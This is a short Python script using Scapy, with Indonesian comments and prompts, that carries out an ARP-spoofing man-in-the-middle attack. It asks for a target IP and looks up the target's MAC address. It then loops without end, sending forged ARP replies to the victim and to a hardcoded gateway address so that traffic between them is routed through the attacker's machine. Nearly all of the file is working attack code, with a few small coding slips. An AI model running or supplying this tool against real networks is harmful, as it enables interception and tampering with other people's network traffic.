from operator import delitem
from socket import timeout
from tabnanny import verbose
from time import sleep
from scapy.all import *
from scapy.all import ARP, Ether

# Membuat input ip target
print("IP target anda : ", end='')
ip_target = str(input())

# Create ethernet layer
# destination mac set as default (broadcast)
ether_layer = Ether()

# create arp layer
# set IP destionation
arp_layer = ARP(pdst=ip_target)

# create packet
packet_mac = ether_layer / arp_layer


try:
    result = srp(packet_mac, timeout=2, verbose=False)
    getway_ip = "192.168.48.250"
    getway_mac = "7a:b9:6a:61:3f:32"
    attacker_mac = result[0][0][0].hwsrc
    attacker_ip = result[0][0][0].psrc
    target_mac = result[0][0][1].hwsrc

    print ("| \x1b[1;37;40mAttackr IP\t:\x1b[0m\t", attacker_ip)
    print ("| \x1b[1;37;40mAttackr MAC\t:\x1b[0m\t", attacker_mac)
    print ("| \x1b[1;37;40mTarget MAC\t:\x1b[0m\t", target_mac)

    print("-`-`-`-`-`-`-`-`-`-`-`-`-`-`-`-`-`")
    print("Spoofing target")

    # target victim 
    arp_victim = ARP (op=2, pdst=ip_target, hwdst=target_mac, psrc=getway_ip)
    arp_router = ARP (op=2, pdst=getway_ip, hwdst=getway_mac, psrc=ip_target)
    # print(arp_victim.show())
    # print(arp_router.show())

    # send arp answer
    try:
        while True:
            send(arp_victim)
            send(arp_router)
            time.sleep(2)
    except:
        print("exit")
except:
    print ("\x1b[0;34;40m%s\x1b[0m tidak dapat dijangkau"%(ip_target))




